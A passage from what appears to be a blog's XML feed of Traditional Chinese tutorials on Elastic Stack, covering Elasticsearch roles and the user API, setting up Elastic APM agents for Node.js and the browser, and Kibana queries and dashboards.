讓使用者可以對任何 Index 做快照</li><li><code>superuser</code>: 超級使用者</li><li><code>transport_client</code>: 使用者可以看所有的 metadata、但不能讀資料</li><li><code>watcher_admin</code>: <code>.watches</code> 的控制權</li><li><code>watcher_user</code>: 可以存取 <code>.watches</code></li></ul><h2 id="使用者與角色管理"><a href="#使用者與角色管理" class="headerlink" title="使用者與角色管理"></a>使用者與角色管理</h2><p>要進行使用者與角色管理有兩種方式</p><ul><li>Kibana GUI 中的使用者與角色設定<ul><li>新增 Role</li><li>加入相關權限</li><li>新增使用者</li><li>加入相關 Role<blockquote><p>如下圖箭頭指的三個位置<br><img src="/2020/09/13/elastic-security-role-based-access-control/SecurityPrivileges.JPG" alt="SecurityPrivileges"></p></blockquote></li></ul></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api.html">Security API</a>: 透過寫程式打 API 進行操作，可能在只安裝 Elasticsearch 才有需要? 底下就是示範新增一個 <code>test-user </code>並進行相關設定，其實 Kibana GUI 理論上也是打 API 完成設置，所以有可以用就不需要再自己寫一套了?<ul><li>Create and update users</li><li>Create and update roles</li><li>Change passwords</li><li>Delete users&#x2F;roles</li><li>Disable&#x2F;Enable users</li><li>Get users&#x2F;roles</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /_security/user/test-user</span><br><span class="line">&#123;</span><br><span class="line">  &quot;password&quot; : &quot;test-password&quot;,</span><br><span class="line">  &quot;roles&quot; : [ &quot;safety_inspector&quot;],</span><br><span class="line">  &quot;full_name&quot; : &quot;test test&quot;,</span><br><span class="line">  &quot;email&quot; : &quot;test@test.com&quot;,</span><br><span class="line">  &quot;metadata&quot; : &#123;</span><br><span class="line">    &quot;hometown&quot; : &quot;test&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic APM 基礎教學</title>
      <link href="/2020/09/12/elastic-apm-fundamentals/"/>
      <url>/2020/09/12/elastic-apm-fundamentals/</url>
      
        <content type="html"><![CDATA[<h2 id="Elastic-APM-基礎教學"><a href="#Elastic-APM-基礎教學" class="headerlink" title="Elastic APM 基礎教學"></a>Elastic APM 基礎教學</h2><p>這篇文章將簡介怎麼運用 APM client 和 server 端的函式庫來做應用程式層級的監控，接下來會示範如何安裝並使用 APM (Application Performance Monitoring) 傳送 Node.js 服務狀態到 Elasticsearch 中，並使用 Kibana 即時監控相關資料。</p><p>APM 是 Application Performance Monitoring 的縮寫，主要是即時監控軟體服務的工具，會蒐集效能相關資訊像是 request 回應時間、資料庫 query 時間等等，幫助我們更快找到效能瓶頸去修正。</p><p>為什麼服務的監控很重要?</p><ul><li>同一台主機可能很多服務，要知道哪些服務是耗哪些資源才有優化方向</li></ul><p>解決的痛點:</p><ul><li>方便分析服務是耗什麼資源 (CPU、記憶體、流量)</li><li>可以更快的知道哪裡 (某個 API) 花太多時間</li><li>可以用來記錄流程面 (非系統掛掉) 的錯誤<br><img src="/2020/09/12/elastic-apm-fundamentals/SendError.JPG" alt="SendError"></li></ul><h3 id="Node-js-實作"><a href="#Node-js-實作" class="headerlink" title="Node.js 實作"></a>Node.js 實作</h3><p>Server 端實作大致分成幾個步驟</p><ul><li><code>npm install express --save</code></li><li>開 API<ul><li><code>/</code> 一般 API</li><li><code>/slow</code> 回應很慢的 API</li><li><code>/erro</code> 拋出錯誤的 API</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/slow&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">  &#125;, <span class="number">50</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/error&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  apm.<span class="title function_">captureError</span>(err);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>Client 端就是在瀏覽器一直打 API，方便我們之後看報表</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; <span class="number">999</span>; index++) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;/slow&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (index % <span class="number">17</span>) &#123;</span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&quot;/error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安裝-APM"><a href="#安裝-APM" class="headerlink" title="安裝 APM"></a>安裝 APM</h3><ol><li><code>npm install elastic-apm-node --save</code></li><li>把 APM 引入並放在程式最前面</li><li>補上 <code>apm.captureError(err);</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add this to the VERY top of the first file loaded in your app</span></span><br><span class="line"><span class="keyword">var</span> apm = <span class="built_in">require</span>(<span class="string">&quot;elastic-apm-node&quot;</span>).<span class="title function_">start</span>(&#123;</span><br><span class="line">  <span class="comment">// Override service name from package.json</span></span><br><span class="line">  <span class="comment">// Allowed characters: a-z, A-Z, 0-9, -, _, and space</span></span><br><span class="line">  <span class="attr">serviceName</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use if APM Server requires a token</span></span><br><span class="line">  <span class="attr">secretToken</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set custom APM Server URL (default: http://localhost:8200)</span></span><br><span class="line">  <span class="attr">serverUrl</span>:</span><br><span class="line">    <span class="string">&quot;https://18f3dcb3963748b7b2014755329bded7.apm.asia-east1.gcp.elastic-cloud.com:443&quot;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/error&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> err = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Ups, something broke!&quot;</span>);</span><br><span class="line">  apm.<span class="title function_">captureError</span>(err);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="運用-Kibana-監看-APM"><a href="#運用-Kibana-監看-APM" class="headerlink" title="運用 Kibana 監看 APM"></a>運用 Kibana 監看 APM</h3><p>目標是讓 APM 的紀錄進來，所以到 Kibana 選單中 Observability 的 APM 監控，有幾個方便的功能:</p><ul><li><p>Transactions 記錄各個 API 花了多少時間</p><blockquote><p>時間維度的圖表<br><img src="/2020/09/12/elastic-apm-fundamentals/Transaction.JPG" alt="Transaction"></p></blockquote><blockquote><p>各 API 分析，Slow 明顯比較慢<br><img src="/2020/09/12/elastic-apm-fundamentals/Performance.JPG" alt="Performance"></p></blockquote></li><li><p>Errors 記錄錯誤是在哪裏發生</p><blockquote><p>可以看出發生的行數<br><img src="/2020/09/12/elastic-apm-fundamentals/Error.JPG" alt="Error"></p></blockquote></li><li><p>Metrics 基本硬體資訊紀錄</p><blockquote><p><img src="/2020/09/12/elastic-apm-fundamentals/Metrics.JPG" alt="Metrics"></p></blockquote></li><li><p>Service Map 所有的服務地圖</p><blockquote><p><img src="/2020/09/12/elastic-apm-fundamentals/ServiceMap.JPG" alt="ServiceMap"></p></blockquote></li></ul><h3 id="應用程式層級監控"><a href="#應用程式層級監控" class="headerlink" title="應用程式層級監控"></a>應用程式層級監控</h3><p>在使用者操作前端網頁時，如果發生了不可預期的錯誤，我們該怎麼記錄起來? 在還沒有使用其他工具前，如果要監控並記錄錯誤，直觀通常就是寫出像是底下的程式，透過實作 <code>logMyErrors</code> 及搭配的後端 API 來協助。</p><ul><li>連線不正常: 先存 storage 下次使用者重新進入網頁時偷偷打 API 送回後端資料庫</li><li>連線正常: 直接打 API 傳回去 DB 存</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// 需要測試的語句</span></span><br><span class="line">  data = <span class="title function_">getData</span>(); <span class="comment">// 可拋出例外的函數</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  data = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">  <span class="title function_">logMyErrors</span>(e); <span class="comment">// 把例外物件傳給錯誤處理器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Elastic-APM-深入理解"><a href="#Elastic-APM-深入理解" class="headerlink" title="Elastic APM 深入理解"></a>Elastic APM 深入理解</h2><p>當然也有其他工具像是最近幾年也蠻多人使用的 Sentry，不過這系列主要是討論 Elastic Stack，APM 的存在就是為了簡化實作的部分，提供了:</p><ul><li>應用程式層的監控</li><li>client 端相關效能監控 (real user monitoring)</li></ul><p>主要提供兩個大家會想知道的答案 (根本只有攻城獅才想知道?!!XDDD)</p><ul><li>每次 request 的回應時間</li><li>服務在什麼時候出現哪些錯誤</li></ul><p>一套完整的 APM 會由以下組成</p><ul><li>APM Agents: 是一個 lib 需要寫進去我們的程式裡</li><li>APM Server:<ul><li>beat framwork 實作的 http server</li><li>協助驗證並轉換格式寫入 Elasticsearch</li><li>資料灌爆來不及寫入的時候可以當 bufffer</li><li>與使用者之間多了一層 server 對資料來說也更安全</li><li>開 API 讓更多類型的 client 容易串接</li></ul></li><li>Elasticsearch: 全文檢索的搜尋引擎</li><li>Kibana: 相當於 Elasticsearch 的後台 GUI</li></ul><h3 id="APM-Data-Modal"><a href="#APM-Data-Modal" class="headerlink" title="APM Data Modal"></a>APM Data Modal</h3><p>APM 記錄了<a href="https://www.elastic.co/guide/en/apm/get-started/current/apm-data-model.html">不同類型的資訊</a>:</p><ul><li>Spans: 算是最基礎的單位，紀錄的內容包含執行的行數，會記錄某個活動的開始到結束<ul><li>transaction.id: 紀錄對應到哪個 transaction</li><li>parent.id: Span 可能被 Span 或 transaction 包含</li><li>start time and duration</li><li>name</li><li>type</li><li>stack trace (optional)</li></ul></li><li>Transactions: 多加上一些特殊 attribute 的 span，通常紀錄像是打到 server 的 request、Batch 或背景任務，通常理論上就是看這個<ul><li>事件發生當下的 timestamp</li><li>unique id, type, name</li><li>相關的執行環境<ul><li>service: environment, framework, language</li><li>host: architecture, hostname, IP</li><li>process: args, PID, PPID</li><li>URL: full, domain, port, query</li><li>user: email, ID, username (如果有)</li></ul></li></ul></li><li>Errors: 原始的 exception 訊息<ul><li>例外發生時的訊息</li><li>在哪裏發生的</li><li>相關的 Transaction ID</li></ul></li></ul><h3 id="APM-Server"><a href="#APM-Server" class="headerlink" title="APM Server"></a>APM Server</h3><p>最重要的就是要先<a href="https://www.elastic.co/downloads/apm">下載並安裝 APM server</a>，裝在本機跑起來之後預設會是 <code>http://localhost:8200</code>，然後會傳到 <code>http://localhost:9200</code> 的 Elasticsearch，把 <code>apm-server.yml</code> 中的 <code>apm-server.rum.enabled</code>，使用 Elastic Cloud 的話就是要注意要記得選有 APM 的，選對就會看到如下圖，接著點 kibana 首頁的 Add APM 照著教學裡面自動帶入的參數使用即可。</p><blockquote><p>確認選到有 APM 模組的<br><img src="/2020/09/12/elastic-apm-fundamentals/ElasticApplications.JPG" alt="ElasticApplications"><br>按照下圖範例中自動帶入的連結、token<br><img src="/2020/09/12/elastic-apm-fundamentals/AddAPM.JPG" alt="AddAPM"></p></blockquote><h3 id="APM-Agents"><a href="#APM-Agents" class="headerlink" title="APM Agents"></a>APM Agents</h3><p>APM agents 主要分成 Server 端和 Client 端兩種，且都需要自行加入到專案中，依照常撰寫的語言進行下載配置即可，Server 端 Node.js 的實作在剛剛已經示範過了。下面介紹的是 Client 端 JS 的部分，其中 serviceName 是用來分類用的，可自行命名。在 Client 端的實作也可以叫做 Real User Monitoring:</p><ul><li><a href="https://www.npmjs.com/package/@elastic/apm-rum"><code>npm install -S @elastic/apm-rum</code></a></li><li>在程式最開始加入下面配置</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> apm = <span class="title function_">ininApm</span>(&#123;</span><br><span class="line">  <span class="comment">// Override service name from package.json</span></span><br><span class="line">  <span class="comment">// Allowed characters: a-z, A-Z, 0-9, -, _, and space</span></span><br><span class="line">  <span class="attr">serviceName</span>: <span class="string">&quot;virus-and-where-to-find-them&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use if APM Server requires a token</span></span><br><span class="line">  <span class="attr">secretToken</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set custom APM Server URL (default: http://localhost:8200)</span></span><br><span class="line">  <span class="attr">serverUrl</span>:</span><br><span class="line">    <span class="string">&quot;https://e9047bd2f1e84a619b8462911fe9378b.apm.asia-east1.gcp.elastic-cloud.com:443&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>APM agents 在配置好後通常會自動蒐集相關可以蒐集的數據資訊，應該理論上就可以從這些 client 或 Server 中蒐集的數據找到程式的效能瓶頸，當然其他進階的部分還是要看<a href="https://www.elastic.co/guide/en/apm/agent/rum-js/current/api.html">相關 API</a> 進行相關程式碼撰寫，初步可以看出的相關資訊可能如下:</p><ul><li>Server 是否有 latency</li><li>部分類似 GA 的統計</li></ul><blockquote><p>進行網頁操作後產生的數據範例<br><img src="/2020/09/12/elastic-apm-fundamentals/APMTransactions.JPG" alt="APMTransactions"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Kibana 快速入門</title>
      <link href="/2020/09/10/elastic-kibana-quick-start/"/>
      <url>/2020/09/10/elastic-kibana-quick-start/</url>
      
        <content type="html"><![CDATA[<h2 id="Kibana-介紹"><a href="#Kibana-介紹" class="headerlink" title="Kibana 介紹"></a>Kibana 介紹</h2><p>這篇文章會簡介 Kibana 設定和 Kibana Query 的教學，透過 Kibana Dashboard 把資料視覺化，帶著大家一起第一次使用 Kibana 畫圖就上手。Kibana 可以看成是 Elastic Stack 的後台管理介面，不需要太多資料庫的知識也能夠進行相關操作。</p><ul><li>透過 Kibana 可以分析、搜尋、操作、視覺化 Elasticsearch 中的資料</li><li>透過 Kibana 可以管理 Elastic Stack 的相關設定</li></ul><p>解決的痛點:</p><ul><li>資料視覺化: 一張圖勝過千筆萬筆資料</li><li>Kibana Lens 提供簡單直觀的拖拉式視覺化工具</li><li>Dashboards: 提供預設範本也可自訂和編輯</li><li>Alert 機制: 設定 thresholds 來觸發特定動作 (Slack 通知、寄信等等)</li></ul><p>名詞解釋:</p><ul><li>Event: Logs 在 Kibana 中稱為 Events，包含 timestamp 及相關資訊</li><li>Document: 每筆 Log 最後會變成的 JSON object</li><li>Index: Document 的容器，用來整理資料協助工作流程用</li></ul><p>解決商業面問題</p><ul><li>有多少使用者名稱叫桃貴?</li><li>上一個月有到澎湖旅遊的使用者清單?</li><li>哪隻 API 會常常回傳 404?</li></ul><p>要回答上面的問題只是把問題輸入在搜尋框是行不通的，在文字搜尋提供了以下三種</p><ul><li>KQL (Kibana Query Language)</li><li>The Lucene query</li><li>The query DSL (Domain Specific Language)</li></ul><h3 id="Kibana-資料操作"><a href="#Kibana-資料操作" class="headerlink" title="Kibana 資料操作"></a>Kibana 資料操作</h3><p>資料可以大致分成兩類</p><ul><li>Static datasets: 通常大小不太會變，像是旅館空房數</li><li>Time series datasets: 按照時間 (每天、周、月) 來做 Index 會比較容易管理<ul><li>建議建立 Time-based 的 Index</li></ul></li></ul><p>Kibana 雖然提供將資料直接上傳的介面但並不會儲存及運算資料，資料的儲存和運算都會在 Elasticsearch 中，可以 <a href="access.log">下載我的範例 access.log</a> 就可以直接上傳來試用介面了。</p><ul><li>限制 100 MB，常見的 log 檔都可以直接上傳</li><li>特殊格式 TSV、CSV、JSON</li></ul><p><img src="/2020/09/10/elastic-kibana-quick-start/UploadDataFromLogFile.JPG" alt="UploadDataFromLogFile"></p><h3 id="Kibana-設定"><a href="#Kibana-設定" class="headerlink" title="Kibana 設定"></a>Kibana 設定</h3><p>要開始使用厲害的視覺化功能前，當收到檔案後，有些步驟可以先進行資料的確認</p><ul><li>設定 Index Patterns 彙整相關 index，通常照教學只有少部分需要自行設置<br><img src="/2020/09/10/elastic-kibana-quick-start/IndexPatterns.JPG" alt="IndexPatterns"></li><li>Discover 介面可以查看資料，透過設定和切換 Filters 來加速篩選，常用的可以 Pin 起來<br><img src="/2020/09/10/elastic-kibana-quick-start/KibanaDiscover.JPG" alt="KibanaDiscover"></li></ul><h3 id="Kibana-Query-教學"><a href="#Kibana-Query-教學" class="headerlink" title="Kibana Query 教學"></a>Kibana Query 教學</h3><p>在 Discover 搜尋我們可以在關鍵字中使用 KQL，譬如台灣有幾個桃貴，我們可以搜尋 <code>桃貴 台灣</code> 可能會找出蠻多不那麼相關的結果，只要有吻合 <code>桃貴</code> 或是 <code>台灣</code> 的結果都會出現，如果想要更精確可以</p><ul><li>取交集 <code>桃貴 and 台灣</code></li><li>補上欄位 <code>user:桃貴 and country:台灣</code></li><li>補上年紀 <code>user:桃貴 and country:台灣 and age:&lt;5</code></li></ul><p>如果資料是多層的如下，舉例來說指令就可以 <code>items:&#123; name:banana and stock &gt; 10 &#125;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;grocery_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Elastic Eats&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;banana&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;stock&quot;</span><span class="punctuation">:</span> <span class="string">&quot;12&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;category&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fruit&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;peach&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;stock&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;category&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fruit&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;carrot&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;stock&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;category&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vegetable&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;broccoli&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;stock&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;category&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vegetable&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Kibana-Dashboard"><a href="#Kibana-Dashboard" class="headerlink" title="Kibana Dashboard"></a>Kibana Dashboard</h3><p>Kibana Lens 資料視覺化的拖拉工具，覺得算是最容易入門的，使用方式就是將最左側相關欄位拖拉到右側的 X 跟 Y 軸，底下會有建議的樣式出現。</p><ul><li>把 @timestamp 放到 X 軸</li><li>Response Body Byte 放到 Y 軸</li><li>用 status code 去分類</li></ul><p><img src="/2020/09/10/elastic-kibana-quick-start/KibanaLens.JPG" alt="KibanaLens"></p><p>Time-Series Visualization Builder (TSVB) 是專門處理 time-series data 用的，可以在一個畫面疊好幾個上去，這個部分就還沒深入研究，不過看起來還蠻厲害的。</p><p><img src="/2020/09/10/elastic-kibana-quick-start/TSVB.JPG" alt="TSVB"></p><p>當我們製作好相關視覺化元件後就可以加入到 Dashboard 中，從以上操作可以發現，並不需要 Elasticsearch 的專業知識就可以進行操作，複雜的運算與效能調整 Elasticsearch 也都會自動處理好，只需要專注在資料視覺化。</p><p><img src="/2020/09/10/elastic-kibana-quick-start/AddPanelToDashboard.JPG" alt="AddPanelToDashboard"></p><p>在經過一個月的學習之後，操作上只是理解有非常多可以客製化的部分，難免會想資訊圖像化的部分到底可以炫技到什麼程度。</p><p>接下來就帶大家一起來看看匯入 Elsatic cloud 提供範例資料後的資訊圖像化，主要資料有航班交易資料、電商交易資料兩種，讓我們繼續看下去。</p><h4 id="基本圖形"><a href="#基本圖形" class="headerlink" title="基本圖形"></a>基本圖形</h4><p>基本的甜甜圈圖、長條圖，可以看出樣式上提供的空間還是有的。</p><ul><li>電商交易資料，可以提供到平均交易額、每筆訂單交易的商品數量，比較特別的是比例看起來有對應到最大最小值</li><li>航班交易資料</li></ul><blockquote><p>電商交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/PecentRevenue.JPG" alt="PecentRevenue"></p></blockquote><blockquote><p>航班交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/PecentTraffic.JPG" alt="PecentTraffic"></p></blockquote><h4 id="機器學習"><a href="#機器學習" class="headerlink" title="機器學習"></a>機器學習</h4><p>在什麼都還沒設定的情況下，機器學習的功能就能夠先產生滿滿的圖表，可以快速對整體資料有概觀的了解，最大的幫助是能夠更快的做出想要的資訊圖表。</p><blockquote><p>電商交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/MLRevenue.JPG" alt="MLRevenue"></p></blockquote><blockquote><p>航班交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/MLFlight.JPG" alt="MLFlight"></p></blockquote><p>機器學習能做的不只是把資料做快速分類製成圖表，真正強大的地方在預測未來，前提是這個資料的 Pattern 夠明確，顯然下面這個範例資料我選的欄位沒有很好，所以預測介於有跟沒有之間。</p><blockquote><p>預測未來<br><img src="/2020/09/10/elastic-kibana-quick-start/MLForecast.JPG" alt="MLForecast"></p></blockquote><h4 id="複合型圖表"><a href="#複合型圖表" class="headerlink" title="複合型圖表"></a>複合型圖表</h4><p>複合型的圖表，能夠把 time-series 的圖表做疊圖，不管是折線圖、長條圖、點圖都沒有問題，甚至還能夠用變數設定相關樣式</p><blockquote><p>電商交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/ChartRevenue.JPG" alt="ChartRevenue"></p></blockquote><blockquote><p>航班交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/ChartTraffic.JPG" alt="ChartTraffic"></p></blockquote><h4 id="炫技用圖表"><a href="#炫技用圖表" class="headerlink" title="炫技用圖表"></a>炫技用圖表</h4><p>為什麼說是炫技用的圖表，一看就知道底層包了像是 D3.js 的函式庫，不只整合了地理資訊還有能將資訊透過樣式的變化呈現，這如果不是炫技那什麼才是炫技，厲害吧!!!</p><blockquote><p>電商交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/InfoGraphicRevenue.JPG" alt="InfoGraphicRevenue"></p></blockquote><blockquote><p>航班交易資料<br><img src="/2020/09/10/elastic-kibana-quick-start/InfoGraphicTraffic.JPG" alt="InfoGraphicTraffic"></p></blockquote><p>更強的是其實相關圖表還能夠整合實際的設計，這個編輯介面完全是前端攻城獅火力展示的部分，能跟這樣的同事工作一定超棒!!!</p><blockquote><p>圖片來源: <a href="https://www.elastic.co/what-is/kibana-canvas">https://www.elastic.co/what-is/kibana-canvas</a><br><img src="https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/bltf084dd417f3f7807/5ca67af36f69e6812ec33a24/animated-gif-canvas-sql.gif" alt="InfrastructureMonitoring"><br><img src="https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blte86a13ae6e0733c3/5ce2b0f1932da9737b262b85/screenshot-canvas-business-analytics.png" alt="BusinessAnalytics"></p></blockquote><h2 id="更多相關文章"><a href="#更多相關文章" class="headerlink" title="更多相關文章"></a>更多相關文章</h2><p>底下三篇文章整理了學習 Elastic Cloud Stack 的相關心得，也推薦給大家!!!</p><ul><li><a href="/2020/09/30/elastic-cloud-stack-101/?utm_source=link&utm_medium=article&utm_campaign=internal_link">30 天上手 Elastic Cloud 心得分享</a></li><li><a href="/2020/09/02/elastic-logging-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">三步驟完成 Filebeat 設定 : 傳送 Nginx Log 到 Kibana 產生報表</a></li><li><a href="/2020/09/03/elastic-metrics-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Elastic Metric Quick Start (Metricbeat, Kibana, Elasticsearch) : 監控 Nginx 伺服器狀態</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Logging X Filebeat 深入理解</title>
      <link href="/2020/09/09/elastic-observability-logging-introduction/"/>
      <url>/2020/09/09/elastic-observability-logging-introduction/</url>
      
